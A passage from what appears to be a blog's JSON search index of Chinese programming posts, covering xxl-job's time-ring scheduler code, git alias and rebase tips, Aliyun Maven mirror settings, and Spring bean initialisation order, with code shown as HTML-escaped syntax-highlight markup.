class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getMessage&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;logger&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt; xxl-job, JobScheduleHelper#ringThread stop&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;});&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ringThread&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setDaemon&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ringThread&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;xxl-job, admin JobScheduleHelper#ringThread&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ringThread&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt; } private void refreshNextValidTime(XxlJobInfo jobInfo, Date fromTime) throws ParseException { Date nextValidTime = new CronExpression(jobInfo.getJobCron()).getNextValidTimeAfter(fromTime); if (nextValidTime != null) { jobInfo.setTriggerLastTime(jobInfo.getTriggerNextTime()); jobInfo.setTriggerNextTime(nextValidTime.getTime()); } else { jobInfo.setTriggerStatus(0); jobInfo.setTriggerLastTime(0); jobInfo.setTriggerNextTime(0); } } private void pushTimeRing(int ringSecond, int jobId){ // push async ring List&lt;Integer&gt; ringItemData = ringData.get(ringSecond); if (ringItemData == null) { ringItemData = new ArrayList&lt;Integer&gt;(); ringData.put(ringSecond, ringItemData); } ringItemData.add(jobId); &lt;span class=&quot;n&quot;&gt;logger&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;debug&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt; xxl-job, schedule push time-ring : &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ringSecond&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot; = &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Arrays&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;asList&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ringItemData&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; } public void toStop(){ &lt;span class=&quot;c1&quot;&gt;// 1、stop schedule&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;scheduleThreadToStop&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;TimeUnit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;SECONDS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// wait&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;InterruptedException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;logger&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getMessage&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;scheduleThread&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getState&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;State&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;TERMINATED&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;){&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// interrupt and wait&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;scheduleThread&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;interrupt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;scheduleThread&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;InterruptedException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;logger&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getMessage&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// if has ring data&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hasRingData&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ringData&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;isEmpty&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;second&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ringData&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;keySet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;nc&quot;&gt;List&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Integer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmpData&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ringData&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;second&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmpData&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmpData&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&amp;gt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;hasRingData&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;   &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hasRingData&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;nc&quot;&gt;TimeUnit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;SECONDS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;InterruptedException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;logger&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getMessage&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// stop ring (wait job-in-memory stop)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ringThreadToStop&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;TimeUnit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;SECONDS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;InterruptedException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;logger&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getMessage&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ringThread&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getState&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;State&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;TERMINATED&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;){&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// interrupt and wait&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ringThread&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;interrupt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;ringThread&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;InterruptedException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;logger&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getMessage&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;logger&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt; xxl-job, JobScheduleHelper stop&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; } } ",
      "url"      : "http://localhost:4000/2020/10/15/xxl-job-timewheel/"
    } ,
  
    {
      "title"    : "git最佳实践",
      "category" : "git",
      "content": "使用git过程中的一些最佳实践 用git缩写命令 把下面配置添加到用户根目录下面的.gitconfig配置文件中 [alias] st = status ci = commit br = branch co = checkout 在主分支上合并commit （待验证） 主分支是develop，本地分支是feature // 把feature分支合并到develop分支，同时合并feature上的多个提交 // 先check out到develop分支，再执行下面命令，最后显式commit // --squash选项不会自动commit git merge --squash feature 在本地分支上合并主分支commit 主分支是develop，本地分支是feature // git pull origin master 会多出一个merge commit // --rebase 会先将主分支commit应用到本地分支，再把本地分支的commit加在后面，不会多出一个 // merge commit，除非有冲突需要显式merge git pull --rebase origin master ",
      "url"      : "http://localhost:4000/2020/10/16/git/"
    } ,
  
    {
      "title"    : "maven项目构建依赖下载慢问题",
      "category" : "maven",
      "content": "从github或者gitee clone下来的项目maven构建时依赖下载慢问题，可以把maven中央参考修改为aliyun 用户根目录下面修改/增加 ~/.m2/settings.xml文件，内容参考如下： &lt;settings xmlns=http://maven.apache.org/SETTINGS/1.0.0 xmlns:xsi=http://www.w3.org/2001/XMLSchema-instance xsi:schemaLocation=http://maven.apache.org/SETTINGS/1.0.0     http://maven.apache.org/xsd/settings-1.0.0.xsd&gt; &lt;localRepository/&gt; &lt;interactiveMode/&gt; &lt;usePluginRegistry/&gt; &lt;offline/&gt; &lt;pluginGroups/&gt; &lt;servers/&gt; &lt;mirrors&gt;  &lt;mirror&gt; &lt;id&gt;aliyunmaven&lt;/id&gt; &lt;mirrorOf&gt;central&lt;/mirrorOf&gt; &lt;name&gt;阿里云公共仓库&lt;/name&gt; &lt;url&gt;https://maven.aliyun.com/repository/central&lt;/url&gt;  &lt;/mirror&gt;  &lt;mirror&gt;  &lt;id&gt;repo1&lt;/id&gt;  &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;  &lt;name&gt;central repo&lt;/name&gt;  &lt;url&gt;http://repo1.maven.org/maven2/&lt;/url&gt;  &lt;/mirror&gt;  &lt;mirror&gt; &lt;id&gt;aliyunmaven&lt;/id&gt; &lt;mirrorOf&gt;apache snapshots&lt;/mirrorOf&gt; &lt;name&gt;阿里云阿帕奇仓库&lt;/name&gt; &lt;url&gt;https://maven.aliyun.com/repository/apache-snapshots&lt;/url&gt;  &lt;/mirror&gt; &lt;/mirrors&gt; &lt;proxies/&gt; &lt;activeProfiles/&gt; &lt;profiles&gt;  &lt;profile&gt;   &lt;repositories&gt;  &lt;repository&gt;    &lt;id&gt;aliyunmaven&lt;/id&gt;    &lt;name&gt;aliyunmaven&lt;/name&gt;    &lt;url&gt;https://maven.aliyun.com/repository/public&lt;/url&gt;    &lt;layout&gt;default&lt;/layout&gt;    &lt;releases&gt;     &lt;enabled&gt;true&lt;/enabled&gt;    &lt;/releases&gt;    &lt;snapshots&gt;     &lt;enabled&gt;true&lt;/enabled&gt;    &lt;/snapshots&gt;   &lt;/repository&gt;   &lt;repository&gt;    &lt;id&gt;MavenCentral&lt;/id&gt;    &lt;url&gt;http://repo1.maven.org/maven2/&lt;/url&gt;   &lt;/repository&gt;   &lt;repository&gt;    &lt;id&gt;aliyunmavenApache&lt;/id&gt;    &lt;url&gt;https://maven.aliyun.com/repository/apache-snapshots&lt;/url&gt;   &lt;/repository&gt;  &lt;/repositories&gt;    &lt;/profile&gt; &lt;/profiles&gt; &lt;/settings&gt; 目测项目构建时依赖下载更新快了不少。 参考 知乎 ",
      "url"      : "http://localhost:4000/2020/10/16/maven-repo/"
    } ,
  
    {
      "title"    : "spring bean初始化顺序",
      "category" : "spring",
      "content": "spring bean初始化顺序（不包括BeanFactory的创建/属性注入准备） Constructor（构造函数） &gt; @PostConstruct &gt; InitializingBean &gt; init-method 代码验证如下。主要注意的是@PostConstruct执行的InitDestroyAnnotationBeanPostProcessor的postProcessBeforeInitialization /** * @Author: shidonghua * @Description: * @Date: 10/16/20 11:38 * @Version: 1.0 * https://programmer.help/blogs/after-properties-set-and-init-method-postconstruct-of-spring-initializing-bean.html * postConstruct 对应的是BeanPostProcessor的postProcessBeforeInitialization * 执行顺序是：Constructor &gt; @PostConstruct &gt; InitializingBean &gt; init-method -&gt; preDestroy -&gt; destroy -&gt; destroy-method */ public class InitSequenceBean implements InitializingBean, DisposableBean { &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;InitSequenceBean&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;InitSequenceBean: constructor&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;nd&quot;&gt;@PostConstruct&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;postConstruct&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;InitSequenceBean: postConstruct&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;nd&quot;&gt;@PreDestroy&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;preDestory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;InitSequenceBean: preDestroy&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;initMethod&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;InitSequenceBean: init-method&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;destroyMethod&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;InitSequenceBean: destroy-method&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span 